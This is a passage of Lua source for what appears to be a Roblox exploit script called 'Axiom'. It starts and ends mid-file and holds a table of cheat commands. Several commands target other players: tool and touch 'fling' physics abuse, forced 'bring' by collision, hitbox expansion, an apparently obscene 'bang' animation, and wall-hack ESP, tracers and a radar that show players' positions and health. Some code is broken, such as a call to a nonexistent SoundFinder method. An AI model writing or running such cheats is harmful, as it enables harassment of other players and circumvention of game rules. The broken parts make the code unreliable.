							AgentRadius = 2,
							AgentHeight = 5,
							AgentCanJump = true,
							AgentCanClimb = true,
						})

						local success = pcall(function()
							path:ComputeAsync(hrp.Position, targetPos)
						end)

						if success and path.Status == Enum.PathStatus.Success then
							currentWaypoints = path:GetWaypoints()
							waypointIndex = 1
						else
							currentWaypoints = nil
						end
					end

					if currentWaypoints and currentWaypoints[waypointIndex] then
						local waypoint = currentWaypoints[waypointIndex]

						if waypoint.Action == Enum.PathWaypointAction.Jump then
							humanoid.Jump = true
						end

						humanoid:MoveTo(waypoint.Position)

						local dist = (hrp.Position - waypoint.Position).Magnitude
						if dist < 3 then
							waypointIndex += 1
							if waypointIndex > #currentWaypoints then
								currentWaypoints = nil 
							end
						end
					end
				end)
			end
		},

		{
			Name = "Unfollow",
			Aliases = {"unfollow"},
			Description = "Stops following.",
			Usage = "unfollow",
			Arguments = {},
			Run = function(args)
				FollowLoop.Active = false
				if FollowLoop.Connection then
					FollowLoop.Connection:Disconnect()
					FollowLoop.Connection = nil
				end

				local character = getChar()
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if humanoid then
					humanoid:MoveTo(humanoid.RootPart.Position) 
				end
			end
		},
		{
			Name = "ToolFling",
			Aliases = {"toolfling"},
			Description = "Makes a tool in your inventory fling people.",
			Usage = "toolfling",
			Arguments = {},
			Run = function(args)
				local olddh = workspace.FallenPartsDestroyHeight
				workspace.FallenPartsDestroyHeight = 0/0
				local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool") or nil
				if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
				tool.Handle.Massless = true
				tool.Grip = CFrame.new(0, 10000, 0)
				tool.Parent = getChar()
				workspace.FallenPartsDestroyHeight = olddh
			end
		},
		
		{
			Name = "TouchFling",
			Aliases = {"touchfling"},
			Description = "Makes you fling people on touch using a tool.",
			Usage = "touchfling",
			Arguments = {},
			Run = function(args)
				local olddh = workspace.FallenPartsDestroyHeight
				workspace.FallenPartsDestroyHeight = 0/0
				local tool = getBp():FindFirstChildOfClass("Tool") or getChar():FindFirstChildOfClass("Tool") or nil
				if tool == nil then 
						notice("Axiom prevent a command from running due to: tool == nil")
						return end
				disableatoolnim()
				tool.Handle.Massless = true
				local doonce = false
				tool.Grip = CFrame.new(0, 10000, 0)
				tool.Parent = getChar()
				workspace.FallenPartsDestroyHeight = olddh
			end
		},
		
		{
			Name = "FakeLag",
			Aliases = {"fakelag"},
			Description = "Makes you lag for other players.",
			Usage = "fakelag",
			Arguments = {},
			Run = function(args)
				Lagging = true
				getChar().Humanoid.WalkSpeed = 17
				getChar().Humanoid.JumpPower = 60
				repeat 
					game:GetService("RunService").PreRender:Wait()
					if not getChar():FindFirstChild("HumanoidRootPart") then return end
					getChar():FindFirstChild("HumanoidRootPart").Anchored = true
					wait()
					getChar():FindFirstChild("HumanoidRootPart").Anchored = false
				until Lagging == false
			end
		},
		
		{
			Name = "UnFakeLag",
			Aliases = {"unfakelag"},
			Description = "Disables FakeLag.",
			Usage = "unfakelag",
			Arguments = {},
			Run = function(args)
				Lagging = false
				getChar().Humanoid.WalkSpeed = 16
				getChar().Humanoid.JumpPower = 45
				getChar.Character.HumanoidRootPart.Anchored = false
			end
		},
		
		{
			Name = "MBring",
			Aliases = {"mbring", "bring", "carpetbring"},
			Description = "Brings a player to you using character collision.",
			Usage = "mbring <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end

					local character = getChar()
					local rootPart = character.HumanoidRootPart
					local hum = character.Humanoid
					local oldCFrame = rootPart.CFrame

					local CARPET_SPEED       = 35
					local UNDER_OFFSET       = 5
					local RISE_HEIGHT        = 4
					local RISE_TIME          = 0.75
					local ON_CARPET_DIST     = 35
					local DEST_THRESHOLD     = 2
					local flying             = false
					local bodyGyro, bodyVelocity

					local targetCharacter = v.Character
					if not targetCharacter then return end
					local targetRoot = targetCharacter:FindFirstChild("HumanoidRootPart")
					if not targetRoot then return end

					local function disableAnimations()
						local humanoid = character:FindFirstChildOfClass("Humanoid")
						if humanoid then
							for _, anim in pairs(humanoid:GetPlayingAnimationTracks()) do
								anim:Stop()
							end
						end
					end

					local function enableFlight()
						nc = true
						
						disableAnimations()
						
						for _, name in ipairs({"carpetGyro", "carpetVelocity"}) do
							local obj = rootPart:FindFirstChild(name)
							if obj then obj:Destroy() end
						end

						bodyGyro = Instance.new("BodyGyro")
						bodyGyro.P = 12000  
						bodyGyro.D = 500
						bodyGyro.MaxTorque = Vector3.new(9e9, 9e9, 9e9)
						bodyGyro.CFrame = rootPart.CFrame * CFrame.Angles(math.rad(90), 0, 0)
						bodyGyro.Name = "carpetGyro"
						bodyGyro.Parent = rootPart

						bodyVelocity = Instance.new("BodyVelocity")
						bodyVelocity.MaxForce = Vector3.new(9e9, 9e9, 9e9)
						bodyVelocity.Velocity = Vector3.zero
						bodyVelocity.Name = "carpetVelocity"
						bodyVelocity.Parent = rootPart
					end

					local function disableFlight()
						if bodyGyro then bodyGyro:Destroy() bodyGyro = nil end
						if bodyVelocity then bodyVelocity:Destroy() bodyVelocity = nil end
						nc = false
						for _, name in ipairs({"carpetGyro", "carpetVelocity"}) do
							local obj = rootPart:FindFirstChild(name)
							if obj then obj:Destroy() end
						end
					end

					local function setFlatFacing(destination)
						if not bodyGyro then return end
						local dir = destination - rootPart.Position
						dir = Vector3.new(dir.X, 0, dir.Z)
						if dir.Magnitude < 0.01 then return end
						dir = dir.Unit
						
						bodyGyro.CFrame = CFrame.new(rootPart.Position, rootPart.Position + dir)
							* CFrame.Angles(math.rad(90), 0, 0)
					end

					local targetHadCollision = targetCharacter.Head.CanCollide
					local function setTargetCollision(state)
						for _, part in ipairs(targetCharacter:GetDescendants()) do
							if part:IsA("BasePart") then part.CanCollide = state end
						end
					end

					local syncConn
					local function startSync()
						syncConn = game:GetService("RunService").Heartbeat:Connect(function()
							targetCharacter = v.Character or targetCharacter
							local fresh = targetCharacter and targetCharacter:FindFirstChild("HumanoidRootPart")
							if fresh then targetRoot = fresh end
							
							disableAnimations()
						end)
					end
					local function stopSync()
						if syncConn then syncConn:Disconnect() syncConn = nil end
					end

					local function sinRise(startPos, riseHeight, riseTime)
						local startTime = tick()
						
						while flying do
							if hum.Health <= 0 then flying = false break end
							
							local elapsed = tick() - startTime
							if elapsed >= riseTime then break end
							
							local t = elapsed / riseTime
							local smoothT = math.sin(t * math.pi / 2)
							local targetY = startPos.Y + riseHeight * smoothT
							
							local diff = targetY - rootPart.Position.Y
							bodyVelocity.Velocity = Vector3.new(0, math.clamp(diff * 2, -20, 20), 0)
							
							setFlatFacing(oldCFrame.Position)
							task.wait(0.03)
						end
						
						bodyVelocity.Velocity = Vector3.zero
						
						task.wait(0.05)
					end

					local function goUnderTarget()
						local underPos = targetRoot.Position - Vector3.new(0, UNDER_OFFSET, 0)
						rootPart.CFrame = CFrame.new(underPos) * CFrame.Angles(math.rad(90), 0, 0)
						bodyVelocity.Velocity = Vector3.zero
						setFlatFacing(oldCFrame.Position)
						task.wait(0.15)
					end

					local function startCarpetRide()
						if flying then return end
						flying = true

						if targetHadCollision then setTargetCollision(false) end
						tempdisableantifling = true
						enableFlight()
						startSync()

						goUnderTarget()
						sinRise(rootPart.Position, RISE_HEIGHT, RISE_TIME)

						local destination = oldCFrame.Position
						local currentVelocity = Vector3.zero

						while flying do
							if hum.Health <= 0 or targetCharacter.Humanoid.Health <= 0 then
								flying = false break
							end

							local riderDist = (targetRoot.Position - rootPart.Position).Magnitude
							if riderDist > ON_CARPET_DIST then
								bodyVelocity.Velocity = Vector3.zero
								currentVelocity = Vector3.zero
								task.wait(0.05)
								goUnderTarget()
								sinRise(rootPart.Position, RISE_HEIGHT, RISE_TIME)
								task.wait(0.05)
								continue
							end

							if (rootPart.Position - destination).Magnitude <= DEST_THRESHOLD then
								flying = false break
							end

							setFlatFacing(destination)
							local dir = (destination - rootPart.Position).Unit
							local targetVel = dir * CARPET_SPEED
							
							currentVelocity = currentVelocity:Lerp(targetVel, 0.15)
							bodyVelocity.Velocity = currentVelocity
							glue(target, true)
							task.wait(0.03)
						end

						flying = false
						if bodyVelocity then bodyVelocity.Velocity = Vector3.zero end

						stopSync()
						disableFlight()

						for _, part in ipairs(character:GetDescendants()) do
							if part:IsA("BasePart") then part.CanCollide = true end
						end
						if targetHadCollision then setTargetCollision(true) end

						task.wait(0.1)
						rootPart.CFrame = oldCFrame + Vector3.new(0, 5, 0)
						tempdisableantifling = false
					end

					startCarpetRide()
				end
			end
		},
	
		{
			Name = "Bang",
			Aliases = {"bang"},
			Description = "Does something to your target.",
			Usage = "bang <player> <value>",
			Arguments = {"player", "value"},
			Run = function(args)
				local target = getPlr(args[1])
				local val = tonumber(args[2]) or 10
				for i,v in pairs(target)do
					if #target == 0 then return end
					bang(v, val)
				end
			end
		},
		
		{
			Name = "UnBang",
			Aliases = {"unbang"},
			Description = "Stops the bang command.",
			Usage = "unbang",
			Arguments = {},
			Run = function(args)
				if bangDied then
					bangDied:Disconnect()
					bang:Stop()
					bangAnim:Destroy()
					bangLoop:Disconnect()
				end
			end
		},
		
		{
			Name = "HitBox",
			Aliases = {"hitbox", "reach"},
			Description = "Expands a players hitbox.",
			Usage = "hitbox <player> <value>",
			Arguments = {"player", "value"},
			Run = function(args)
				local target = getPlr(args[1])
				local size = tonumber(args[2]) or 10
				for i,v in pairs(target)do
					if #target == 0 then return end
					if not v.Character.HumanoidRootPart:FindFirstChild("Highlight") then 
						local HLI = Instance.new("Highlight")
						HLI.DepthMode = "Occluded"
						HLI.FillColor = Color3.fromRGB(85,0,255)
						HLI.FillTransparency = 0.5
						HLI.Parent = v.Character.HumanoidRootPart
					end
					v.Character.HumanoidRootPart.Size = Vector3.new(size, size, size)
					v.Character.HumanoidRootPart.Transparency = 0.75
				end
			end
		},

		{
			Name = "Info",
			Aliases = {"info", "playerinfo"},
			Description = "Show player info in a live window.",
			Usage = "info <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end
					local char = v.Character
					if not char then return end
					local root = char:FindFirstChild("HumanoidRootPart")
					local hum = char:FindFirstChildOfClass("Humanoid")
					
					local infoGui = Instance.new("ScreenGui")
					infoGui.Name = "InfoGui_" .. v.Name
					infoGui.ResetOnSpawn = false
					infoGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
					
					local infoLabel = Instance.new("TextLabel")
					infoLabel.Size = UDim2.new(0, 250, 0, 150)
					infoLabel.Position = UDim2.new(0, 20, 0, 20)
					infoLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					infoLabel.BackgroundTransparency = 0.3
					infoLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
					infoLabel.TextSize = 14
					infoLabel.Font = Enum.Font.Gotham
					infoLabel.TextXAlignment = Enum.TextXAlignment.Left
					infoLabel.TextYAlignment = Enum.TextYAlignment.Top
					infoLabel.Parent = infoGui
					
					local conn
					conn = game:GetService("RunService").Heartbeat:Connect(function()
						if not v or not v.Character then conn:Disconnect() infoGui:Destroy() return end
						local newRoot = v.Character:FindFirstChild("HumanoidRootPart")
						local newHum = v.Character:FindFirstChildOfClass("Humanoid")
						if newRoot and newHum then
							infoLabel.Text = string.format(
								"Player: %s\nUser ID: %d\nHealth: %.0f/%.0f\nTeam: %s\nPosition: (%.1f, %.1f, %.1f)",
								v.Name,
								v.UserId,
								newHum.Health,
								newHum.MaxHealth,
								v.Team and v.Team.Name or "None",
								newRoot.Position.X,
								newRoot.Position.Y,
								newRoot.Position.Z
							)
						end
					end)
				end
			end
		},

		{
			Name = "ChatLog",
			Aliases = {"chatlog", "chats"},
			Description = "Record all chat messages to window.",
			Usage = "chatlog",
			Arguments = {},
			Run = function(args)
				if game.Players.LocalPlayer:FindFirstChild("ChatLogGui") then return end
				
				local chatGui = Instance.new("ScreenGui")
				chatGui.Name = "ChatLogGui"
				chatGui.ResetOnSpawn = false
				chatGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
				
				local chatBox = Instance.new("TextBox")
				chatBox.Size = UDim2.new(0, 400, 0, 300)
				chatBox.Position = UDim2.new(1, -420, 1, -320)
				chatBox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				chatBox.BackgroundTransparency = 0.4
				chatBox.TextColor3 = Color3.fromRGB(0, 255, 0)
				chatBox.TextSize = 12
				chatBox.Font = Enum.Font.Gotham
				chatBox.MultiLine = true
				chatBox.TextYAlignment = Enum.TextYAlignment.Top
				chatBox.ReadOnly = true
				chatBox.Parent = chatGui
				
				local Messages = {}
				local chatService = game:GetService("Chat")
				
				game.Players.LocalPlayer.Chatted:Connect(function(msg)
					table.insert(Messages, "[YOU]: " .. msg)
					if #Messages > 50 then table.remove(Messages, 1) end
					chatBox.Text = table.concat(Messages, "\n")
				end)
				
				for _, player in pairs(game.Players:GetPlayers()) do
					if player ~= game.Players.LocalPlayer then
						player.Chatted:Connect(function(msg)
							table.insert(Messages, "[" .. player.Name .. "]: " .. msg)
							if #Messages > 50 then table.remove(Messages, 1) end
							chatBox.Text = table.concat(Messages, "\n")
						end)
					end
				end
				
				game.Players.PlayerAdded:Connect(function(player)
					player.Chatted:Connect(function(msg)
						table.insert(Messages, "[" .. player.Name .. "]: " .. msg)
						if #Messages > 50 then table.remove(Messages, 1) end
						chatBox.Text = table.concat(Messages, "\n")
					end)
				end)
			end
		},

		{
			Name = "Radar",
			Aliases = {"radar", "minimap"},
			Description = "Show minimap with all player dots.",
			Usage = "radar",
			Arguments = {},
			Run = function(args)
				if game.Players.LocalPlayer:FindFirstChild("RadarGui") then return end
				
				local radarGui = Instance.new("ScreenGui")
				radarGui.Name = "RadarGui"
				radarGui.ResetOnSpawn = false
				radarGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
				
				local radarCanvas = Instance.new("Frame")
				radarCanvas.Size = UDim2.new(0, 200, 0, 200)
				radarCanvas.Position = UDim2.new(1, -220, 0, 20)
				radarCanvas.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				radarCanvas.BackgroundTransparency = 0.5
				radarCanvas.BorderColor3 = Color3.fromRGB(0, 255, 0)
				radarCanvas.Parent = radarGui
				
				local RADAR_SCALE = 0.5 
				
				game:GetService("RunService").Heartbeat:Connect(function()
					for _, child in pairs(radarCanvas:GetChildren()) do
						child:Destroy()
					end
					
					local myChar = game.Players.LocalPlayer.Character
					if not myChar then return end
					local myRoot = myChar:FindFirstChild("HumanoidRootPart")
					if not myRoot then return end
					
					for _, player in pairs(game.Players:GetPlayers()) do
						if player ~= game.Players.LocalPlayer then
							local char = player.Character
							if char then
								local root = char:FindFirstChild("HumanoidRootPart")
								if root then
									local relPos = root.Position - myRoot.Position
									local x = (relPos.X / RADAR_SCALE) + 100
									local z = (relPos.Z / RADAR_SCALE) + 100
									
									if x >= 0 and x <= 200 and z >= 0 and z <= 200 then
										local dot = Instance.new("Frame")
										dot.Size = UDim2.new(0, 6, 0, 6)
										dot.Position = UDim2.new(0, x - 3, 0, z - 3)
										dot.BackgroundColor3 = player.Team and player.Team.TeamColor.Color or Color3.fromRGB(255, 255, 255)
										dot.BorderSizePixel = 0
										dot.Parent = radarCanvas
										
										local label = Instance.new("TextLabel")
										label.Size = UDim2.new(0, 50, 0, 10)
										label.Position = UDim2.new(0, x, 0, z - 10)
										label.BackgroundTransparency = 1
										label.TextColor3 = Color3.fromRGB(255, 255, 255)
										label.TextSize = 8
							label.Font = Enum.Font.Gotham
										label.Text = player.Name
										label.Parent = radarCanvas
									end
								end
							end
						end
					end
					
					local center = Instance.new("Frame")
					center.Size = UDim2.new(0, 8, 0, 8)
					center.Position = UDim2.new(0, 96, 0, 96)
					center.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
					center.BorderSizePixel = 0
					center.Parent = radarCanvas
				end)
			end
		},

		{
			Name = "Heatmap",
			Aliases = {"heatmap", "heat"},
			Description = "Show heat signature vision (players glow by health).",
			Usage = "heatmap <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end
					local char = v.Character
					if not char then return end
					local hum = char:FindFirstChildOfClass("Humanoid")
					if not hum then return end
					
					local maxHealth = hum.MaxHealth
					local conn
					conn = game:GetService("RunService").Heartbeat:Connect(function()
						if not v or not v.Character then conn:Disconnect() return end
						local newHum = v.Character:FindFirstChildOfClass("Humanoid")
						if not newHum then return end
						
						local healthPercent = newHum.Health / newHum.MaxHealth
						local color = Color3.fromRGB(
							255 * (1 - healthPercent),
							255 * healthPercent,
							0
						)
						
						for _, part in pairs(v.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								if not part:FindFirstChild("HeatHighlight") then
									local hi = Instance.new("Highlight")
									hi.Name = "HeatHighlight"
									hi.DepthMode = "Occluded"
									hi.FillTransparency = 0.3
									hi.Parent = part
								end
								part:FindFirstChild("HeatHighlight").FillColor = color
							end
						end
					end)
				end
			end
		},

		{
			Name = "NightVision",
			Aliases = {"nightvision", "nv"},
			Description = "Darken environment, brighten players.",
			Usage = "nightvision",
			Arguments = {},
			Run = function(args)
				local lighting = game:GetService("Lighting")
				local oldBright = lighting.Brightness
				local oldAmbient = lighting.Ambient
				local oldOutAmbient = lighting.OutdoorAmbient
				
				lighting.Brightness = 0.5
				lighting.Ambient = Color3.fromRGB(100, 100, 100)
				lighting.OutdoorAmbient = Color3.fromRGB(100, 100, 100)
				
				for _, player in pairs(game.Players:GetPlayers()) do
					if player.Character then
						for _, part in pairs(player.Character:GetDescendants()) do
							if part:IsA("BasePart") then
								part.Material = Enum.Material.Neon
							end
						end
					end
				end
				
			end
		},

		{
			Name = "Waypoint",
			Aliases = {"waypoint", "wp"},
			Description = "Save current location as waypoint.",
			Usage = "waypoint <name>",
			Arguments = {"name"},
			Run = function(args)
				if not args[1] then notice("Usage: waypoint <name>") return end
				
				local char = game.Players.LocalPlayer.Character
				if not char then return end
				local root = char:FindFirstChild("HumanoidRootPart")
				if not root then return end
				
				if not _G.Waypoints then _G.Waypoints = {} end
				_G.Waypoints[args[1]] = root.Position
				notice("Waypoint '" .. args[1] .. "' saved at " .. tostring(root.Position))
			end
		},

		{
			Name = "GotoWaypoint",
			Aliases = {"gotowp", "gowp"},
			Description = "Teleport to a saved waypoint.",
			Usage = "gotowp <name>",
			Arguments = {"name"},
			Run = function(args)
				if not args[1] then notice("Usage: gotowp <name>") return end
				if not _G.Waypoints or not _G.Waypoints[args[1]] then 
					notice("Waypoint '" .. args[1] .. "' not found") 
					return 
				end
				
				local char = game.Players.LocalPlayer.Character
				if not char then return end
				local root = char:FindFirstChild("HumanoidRootPart")
				if not root then return end
				
				root.CFrame = CFrame.new(_G.Waypoints[args[1]] + Vector3.new(0, 3, 0))
			end
		},

		{
			Name = "Orbit",
			Aliases = {"orbit"},
			Description = "Fly in a circle around a player.",
			Usage = "orbit <player> <radius> or orbit stop",
			Arguments = {"player/stop", "radius"},
			Run = function(args)
				if args[1] and args[1]:lower() == "stop" then
					if _G.OrbitConn then _G.OrbitConn:Disconnect() _G.OrbitConn = nil end
					notice("Orbit stopped")
					return
				end
				
				local target = getPlr(args[1])
				local radius = tonumber(args[2]) or 20
				
				for i, v in pairs(target) do
					if #target == 0 then return end
					tempdisableantifling = true
					local angle = 0
					_G.OrbitConn = game:GetService("RunService").RenderStepped:Connect(function(dt)
						if not v or not v.Character then _G.OrbitConn:Disconnect() return end
						local targetRoot = v.Character:FindFirstChild("HumanoidRootPart")
						if not targetRoot then return end
						
						local char = game.Players.LocalPlayer.Character
						if not char then return end
						local root = char:FindFirstChild("HumanoidRootPart")
						if not root then return end
						
						angle = angle + dt * 2 
						local x = math.cos(angle) * radius
						local z = math.sin(angle) * radius
						root.CFrame = CFrame.new(targetRoot.Position + Vector3.new(x, 0, z))
					end)
					
				end
			end
		},

		{
			Name = "SoundFinder",
			Aliases = {"soundfinder", "sounds"},
			Description = "Show where loud sounds are coming from.",
			Usage = "soundfinder",
			Arguments = {},
			Run = function(args)
				local char = game.Players.LocalPlayer.Character
				if not char then return end
				local root = char:FindFirstChild("HumanoidRootPart")
				if not root then return end
				
				game:GetService("RunService").Heartbeat:Connect(function()
					for _, sound in pairs(game.Workspace:FindPartBySoundChildOfInstance()) do
						if sound:IsA("Sound") and sound.Volume > 0.2 then
							local parent = sound.Parent
							if parent:IsA("BasePart") then
								local line = Instance.new("Part")
								line.CanCollide = false
								line.CanTouch = false
								line.Anchored = true
								line.TopSurface = Enum.SurfaceType.Smooth
								line.BottomSurface = Enum.SurfaceType.Smooth
								line.Shape = Enum.PartType.Cylinder
								line.BrickColor = BrickColor.new("Lime green")
								
								local startPos = root.Position
								local endPos = parent.Position
								local midPos = (startPos + endPos) / 2
								line.CFrame = CFrame.new(midPos, endPos) * CFrame.Angles(0, 0, math.pi / 2)
								line.Size = Vector3.new(0.2, (startPos - endPos).Magnitude, 0.2)
								line.Parent = root
								
								game:GetService("Debris"):AddItem(line, 0.1)
							end
						end
					end
				end)
				
			end
		},

		{
			Name = "TeamCounter",
			Aliases = {"teamcounter", "teams"},
			Description = "Count players on each team.",
			Usage = "teamcounter",
			Arguments = {},
			Run = function(args)
				local teams = {}
				
				for _, player in pairs(game.Players:GetPlayers()) do
					local teamName = player.Team and player.Team.Name or "No Team"
					if not teams[teamName] then teams[teamName] = 0 end
					teams[teamName] = teams[teamName] + 1
				end
				
				local output = "Team Count:\n"
				for teamName, count in pairs(teams) do
					output = output .. teamName .. ": " .. count .. "\n"
				end
				
				notice(output)
			end
		},

		{
			Name = "DeathMarker",
			Aliases = {"deathmarker", "mark"},
			Description = "Mark your death location, teleport back to it.",
			Usage = "deathmarker",
			Arguments = {},
			Run = function(args)
				local char = game.Players.LocalPlayer.Character
				if not char then return end
				local hum = char:FindFirstChildOfClass("Humanoid")
				if not hum then return end
				
				hum.Died:Connect(function()
					local root = char:FindFirstChild("HumanoidRootPart")
					if root then
						_G.DeathMarker = root.Position
						notice("Death marked at " .. tostring(root.Position))
					end
				end)
				
				if _G.DeathMarker then
					local newChar = game.Players.LocalPlayer.Character
					if newChar then
						local newRoot = newChar:FindFirstChild("HumanoidRootPart")
						if newRoot then
							newRoot.CFrame = CFrame.new(_G.DeathMarker + Vector3.new(0, 3, 0))
						end
					end
				end
			end
		},

		{
			Name = "ESP",
			Aliases = {"esp"},
			Description = "Show player names and health through walls.",
			Usage = "esp <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end
					local char = v.Character
					if not char then return end
					local root = char:FindFirstChild("HumanoidRootPart")
					if not root then return end
					
					local billboard = Instance.new("BillboardGui")
					billboard.Adornee = root
					billboard.Size = UDim2.new(0, 100, 0, 50)
					billboard.MaxDistance = math.huge
					billboard.Name = "ESP_" .. v.Name
					billboard.AlwaysOnTop = true
					billboard.Parent = root
					
					local label = Instance.new("TextLabel")
					label.Size = UDim2.new(1, 0, 1, 0)
					label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					label.BackgroundTransparency = 0.4
					label.TextColor3 = Color3.fromRGB(0, 255, 0)
					label.TextSize = 14
					label.Font = Enum.Font.Gotham
					label.Parent = billboard
					
					local hum = char:FindFirstChildOfClass("Humanoid")
					game:GetService("RunService").Heartbeat:Connect(function()
						if not v or not v.Character then billboard:Destroy() return end
						if hum then
							label.Text = v.Name .. "\n" .. math.floor(hum.Health) .. "/" .. math.floor(hum.MaxHealth)
						end
					end)
				end
			end
		},

		{
			Name = "Highlight",
			Aliases = {"highlight", "glow"},
			Description = "Make player glow and visible through walls.",
			Usage = "highlight <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end
					local char = v.Character
					if not char then return end
					
					for _, part in pairs(char:GetDescendants()) do
						if part:IsA("BasePart") then
							if not part:FindFirstChild("Highlight") then
								local hi = Instance.new("Highlight")
								hi.DepthMode = "Occluded"
								hi.FillColor = Color3.fromRGB(255, 0, 255)
								hi.FillTransparency = 0.3
								hi.Parent = part
							end
						end
					end
				end
			end
		},

		{
			Name = "NameTag",
			Aliases = {"nametag", "tag"},
			Description = "Draw custom text above player's head.",
			Usage = "nametag <player> <text>",
			Arguments = {"player", "text"},
			Run = function(args)
				if not args[2] then notice("Usage: nametag <player> <text>") return end
				
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end
					local char = v.Character
					if not char then return end
					local root = char:FindFirstChild("HumanoidRootPart")
					if not root then return end
					
					local billboard = Instance.new("BillboardGui")
					billboard.Adornee = root
					billboard.Size = UDim2.new(0, 100, 0, 30)
					billboard.StudsOffset = Vector3.new(0, 5, 0)
					billboard.MaxDistance = math.huge
					billboard.AlwaysOnTop = true
					billboard.Parent = root
					
					local label = Instance.new("TextLabel")
					label.Size = UDim2.new(1, 0, 1, 0)
					label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					label.BackgroundTransparency = 0.3
					label.TextColor3 = Color3.fromRGB(255, 255, 255)
					label.TextSize = 12
					label.Font = Enum.Font.Gotham
					label.Text = args[2]
					label.Parent = billboard
				end
			end
		},

		{
			Name = "Tracers",
			Aliases = {"tracers", "lines"},
			Description = "Draw lines from you to all players.",
			Usage = "tracers",
			Arguments = {},
			Run = function(args)
				local char = game.Players.LocalPlayer.Character
				if not char then return end
				local root = char:FindFirstChild("HumanoidRootPart")
				if not root then return end
				
				_G.TracersActive = true
				game:GetService("RunService").RenderStepped:Connect(function()
					if not _G.TracersActive then return end
					
					for _, player in pairs(game.Players:GetPlayers()) do
						if player ~= game.Players.LocalPlayer then
							local pChar = player.Character
							if pChar then
								local pRoot = pChar:FindFirstChild("HumanoidRootPart")
								if pRoot then
									local line = Instance.new("Part")
									line.CanCollide = false
									line.CanTouch = false
									line.Anchored = true
									line.TopSurface = Enum.SurfaceType.Smooth
									line.BottomSurface = Enum.SurfaceType.Smooth
									line.Shape = Enum.PartType.Cylinder
									line.BrickColor = BrickColor.new("Cyan")
									line.Material = Enum.Material.Neon
									
									local startPos = root.Position
									local endPos = pRoot.Position
									local midPos = (startPos + endPos) / 2
									line.CFrame = CFrame.new(midPos, endPos) * CFrame.Angles(0, 0, math.pi / 2)
									line.Size = Vector3.new(0.1, (startPos - endPos).Magnitude, 0.1)
									line.Parent = root
									
									game:GetService("Debris"):AddItem(line, 0.05)
								end
							end
						end
					end
				end)
				
			end
		},

		{
			Name = "Distance",
			Aliases = {"distance", "dist"},
			Description = "Show distance to all nearby players.",
			Usage = "distance",
			Arguments = {},
			Run = function(args)
				local char = game.Players.LocalPlayer.Character
				if not char then return end
				local root = char:FindFirstChild("HumanoidRootPart")
				if not root then return end
				
				local distGui = Instance.new("ScreenGui")
				distGui.Name = "DistanceGui"
				distGui.ResetOnSpawn = false
				distGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
				
				local distLabel = Instance.new("TextLabel")
				distLabel.Size = UDim2.new(0, 200, 0, 300)
				distLabel.Position = UDim2.new(1, -220, 1, -320)
				distLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
				distLabel.BackgroundTransparency = 0.4
				distLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
				distLabel.TextSize = 12
				distLabel.Font = Enum.Font.Gotham
				distLabel.TextXAlignment = Enum.TextXAlignment.Left
				distLabel.TextYAlignment = Enum.TextYAlignment.Top
				distLabel.Parent = distGui
				
				game:GetService("RunService").Heartbeat:Connect(function()
					local text = "--- DISTANCES ---\n"
					for _, player in pairs(game.Players:GetPlayers()) do
						if player ~= game.Players.LocalPlayer then
							local pChar = player.Character
							if pChar then
								local pRoot = pChar:FindFirstChild("HumanoidRootPart")
								if pRoot then
									local dist = (root.Position - pRoot.Position).Magnitude
									text = text .. player.Name .. ": " .. string.format("%.1f", dist) .. "m\n"
								end
							end
						end
					end
					distLabel.Text = text
				end)
			end
		},

		{
			Name = "Stats",
			Aliases = {"stats"},
			Description = "Show player stats in a box.",
			Usage = "stats <player>",
			Arguments = {"player"},
			Run = function(args)
				local target = getPlr(args[1])
				for i, v in pairs(target) do
					if #target == 0 then return end
					local char = v.Character
					if not char then return end
					local root = char:FindFirstChild("HumanoidRootPart")
					local hum = char:FindFirstChildOfClass("Humanoid")
					if not root or not hum then return end
					
					local billboard = Instance.new("BillboardGui")
					billboard.Adornee = root
					billboard.Size = UDim2.new(0, 150, 0, 100)
					billboard.MaxDistance = math.huge
					billboard.Name = "Stats_" .. v.Name
					billboard.AlwaysOnTop = true
					billboard.Parent = root
					
					local frame = Instance.new("Frame")
					frame.Size = UDim2.new(1, 0, 1, 0)
					frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
					frame.BackgroundTransparency = 0.3
					frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
					frame.Parent = billboard
					
					local label = Instance.new("TextLabel")
					label.Size = UDim2.new(1, 0, 1, 0)
					label.BackgroundTransparency = 1
					label.TextColor3 = Color3.fromRGB(255, 255, 255)
					label.TextSize = 11
					label.Font = Enum.Font.Gotham
					label.TextYAlignment = Enum.TextYAlignment.Top
					label.Parent = frame
					
					game:GetService("RunService").Heartbeat:Connect(function()
						if not v or not v.Character then billboard:Destroy() return end
						if hum then
							label.Text = string.format(
								"[%s]\nHealth: %.0f/%.0f\nPos: (%.0f, %.0f, %.0f)\nTeam: %s",
								v.Name,
								hum.Health,
								hum.MaxHealth,
								root.Position.X,
								root.Position.Y,
								root.Position.Z,
								v.Team and v.Team.Name or "None"
							)
						end
					end)
				end
			end
		},

		{
			Name = "WhoIs",
